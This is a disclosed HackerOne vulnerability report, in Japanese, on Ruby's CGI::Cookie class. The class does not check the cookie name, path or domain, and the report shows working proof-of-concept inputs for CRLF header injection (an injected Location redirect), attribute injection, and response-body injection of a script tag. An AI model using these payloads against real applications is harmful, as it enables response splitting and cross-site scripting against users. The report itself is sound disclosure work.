# CGI::Cookieクラスにおけるセキュリティ上好ましくない仕様および実装

## Report Details
- **Report ID**: 1204977
- **URL**: https://hackerone.com/reports/1204977
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-05-21T12:21:26.362Z
- **Disclosed**: 2022-11-24T01:47:17.360Z

## Reporter
- **Username**: htokumaru
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
以下のCGIスクリプトについて、name、path、domainに改行、等号、改行のインジェクションが可能

```
#!/usr/bin/env ruby
require "cgi"
cgi = CGI.new
name = "name"
path = "/"
domain = "example.jp"
cookie = CGI::Cookie.new('name' => name,
                         'value' => "value",
                         'domain' => domain,
                        'path' => path)
cgi.out({"cookie" => [cookie]}){ "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n" }
```
(1) nameについて
RFC2616 section-2.2 によるとCookieのnameは以下の記号および制御文字は使えないが、とくにチェックされず指定できる。

> ( ) < > @ , ; : \ " / [ ] ? = { } 

例1: valueとdomain属性をインジェクション
```
name = "a=b; domain=example.com;"              # # サンプルから name = の箇所を変更
```
結果1
```
Set-Cookie: a=b; domain=example.com;=value; domain=example.jp; path=/
```

例2: 改行をインジェクション
```
name = "a=b;\r\nLocation: http://example.com#"                # サンプルから name = の箇所を変更
```
結果2（http://example.com にリダイレクト）
```
Set-Cookie: a=b;
Location: http://example.com#=value; domain=example.jp; path=/
```

(2) pathについて
RFC6265によるとpath属性には制御文字および ; は使えないが、いずれもチェックされず指定できる。

例3:セミコロンによる属性の追加
```
path = "/; samesite=none"           # サンプルから path = の箇所を変更
```
結果3:samesite属性を指定できる
```
Set-Cookie: name=value; domain=example.jp; path=/; samesite=none
```

例4: レスポンスボディのインジェクション
```
path = "/;\r\n\r\n<script>alert(1)</script>"           # サンプルから path = の箇所を変更
```

結果4: JavaScriptの注入
```
HTTP/1.1 200 OK
Date: Fri, 21 May 2021 12:08:08 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: name=value; domain=example.jp; path=/;
Content-Length: 33
Content-Type: text/html

<script>alert(1)</script>

xxxx
```


(3) domainについて
domain属性はホスト名またはドメイン名が許可されるが、セミコロン(;) や改行もチェックされず指定できる。影響はpath属性と同じなので例示は省力する。

## Impact

Cookie設定において、外部からCookieのname、path属性、domain属性が指定できるケースはまれであるため、セキュリティ上の影響は軽微であるが、保険的にチェックされることが好ましい。PHPのsetcookie関数等ではチェックされ、不正な文字を含む場合はエラーとなり、Set-Cookie属性は出力されない。
例外的にnameまたはpath属性、domain属性を外部から指定できる場合は、例で示したように、あらたなレスポンスヘッダあるいはレスポンスボディの追加ができ、JavaScriptの実行などXSSと同等の脅威となる。

また、RFC6265に定めるmax-age属性や最近のブラウザが対応するsamesite属性（[rfc6265bis](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-03#section-5.3.7)など）には対応していない。samesite属性に対応していないのは実用上不便でありCookieを安全な設定にできないという意味でセキュアでもない。

ただし、例3で示す「裏技」によりこれら属性を指定できるが、本来はCGI::Cookieクラスの機能として提供するべきであるし、属性のインジェクションができることは望ましくない。

なお、[マニュアル](https://docs.ruby-lang.org/ja/latest/class/CGI=3a=3aCookie.html)にはhttponly属性の指定方法が記載されていないが、実装はされているようである。

## Attachments
No attachments
